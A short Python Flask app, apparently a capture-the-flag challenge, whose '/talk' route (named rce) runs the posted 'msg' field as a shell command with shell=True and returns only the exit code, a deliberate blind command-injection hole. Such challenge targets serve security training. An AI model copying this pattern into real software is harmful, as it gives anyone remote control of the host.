from flask import Flask, request
import subprocess
import os

app = Flask(__name__)

@app.errorhandler(Exception)
def notfound(e):
    return 'Error: '

@app.route('/talk', methods=['POST'])
def rce():
    cmd = request.form.get('msg', '')
    if not cmd:
        return '数字先生没有听见你在说什么...', 400
    try:
        result = subprocess.run(
            cmd, shell=True,
            stdout=subprocess.DEVNULL,
            stderr=subprocess.DEVNULL
        )
        return "数字先生说：" + str(result.returncode), 200
    except Exception as e:
        return f'Error: {str(e)}', 500
